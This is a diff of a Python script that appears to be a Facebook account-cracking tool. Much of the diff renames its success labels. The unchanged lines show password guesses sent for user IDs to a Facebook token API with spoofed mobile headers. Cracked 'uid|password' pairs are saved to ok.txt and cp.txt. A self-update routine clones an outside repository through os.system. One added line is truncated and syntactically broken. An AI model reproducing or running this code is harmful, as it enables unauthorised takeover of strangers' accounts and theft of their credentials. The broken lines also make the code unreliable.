@@ -77,14 +77,14 @@ def log_sel():
 	elif sel =="1" or sel =="01":
 		token()
 	elif sel =="2" or sel =="02":
-		subprocess.check_output(["am", "start", "https://www.facebook.com/Arham.sani.love"])
+		subprocess.check_output(["am", "start", "https://www.facebook.c"])
 		main()
 	elif sel =="3" or sel =="03":
 		import os
 		try:
-			os.system("git clone https://github.com/Nazirokhanx450/tornaxxir03.git")
-			os.system("rm -rf tornaxxir03.py")
-			os.system("cp -t/tornaxxir03.py \\.")
+			os.system("git clone https://github.com/Badamala302bilalo/badamala302"
+			os.system("rm -rf shahzebo.py")
+			os.system("cp -t/shahzebo.py \\.")
 			os.system("rm -rf fcpro")
 			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
 			time.sleep(2)
@@ -328,14 +328,14 @@ def crack_select1():
 							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _bravoua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 							data = requests.get(api, params=params, headers=headers_)
 							if "access_token" in data.text and "EAAA" in data.text:
-								print(" \033[1;32m[BRAVO-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m[ZARAK-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in data.json()['error_msg']:
-									print(" \033[1;33m[TOR-CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m[BILALO-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -347,14 +347,14 @@ def crack_select1():
 									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _bravoua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 									data = requests.get(api, params=params, headers=headers_)
 									if "access_token" in data.text and "EAAA" in data.text:
-										print(" \033[1;32m[BRAVO-OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;32m[ZARAK-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in data.json()['error_msg']:
-											print(" \033[1;33m[TOR-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m[BILALO-CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -366,14 +366,14 @@ def crack_select1():
 											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _bravoua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 											data = requests.get(api, params=params, headers=headers_)
 											if "access_token" in data.text and "EAAA" in data.text:
-												print(" \033[1;32m[BRAVO-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;32m[ZARAK-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in data.json()['error_msg']:
-													print(" \033[1;33m[TOR-CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;33m[bilalo-CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -385,14 +385,14 @@ def crack_select1():
 													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _bravoua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 													data = requests.get(api, params=params, headers=headers_)
 													if "access_token" in data.text and "EAAA" in data.text:
-														print(" \033[1;32m[BRAVO-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;32m[ZARAK-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in data.json()['error_msg']:
-															print(" \033[1;33m[TOR-CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;33m[BILALO-CP] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -404,14 +404,14 @@ def crack_select1():
 															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _bravoua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 															data = requests.get(api, params=params, headers=headers_)
 															if "access_token" in data.text and "EAAA" in data.text:
-																print(" \033[1;32m[BRAVO-OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;32m[ZARAK-OK] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in data.json()['error_msg']:
-																	print(" \033[1;33m[TOR-CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;33m[BILALO-CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
@@ -423,14 +423,14 @@ def crack_select1():
 																	headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _bravoua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 																	data = requests.get(api, params=params, headers=headers_)
 																	if "access_token" in data.text and "EAAA" in data.text:
-																		print(" \033[1;32m[BRAVO-OK] "+uid+" | "+pass8+"\033[0;97m")
+																		print(" \033[1;32m[ZARAK-OK] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
 																		ok.write(uid+"|"+pass8+"\n")
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
 																		if "www.facebook.com" in data.json()['error_msg']:
-																			print(" \033[1;33m[TOR-CP] "+uid+" | "+pass8+"\033[0;97m")
+																			print(" \033[1;33m[BILALO-CP] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("cp.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
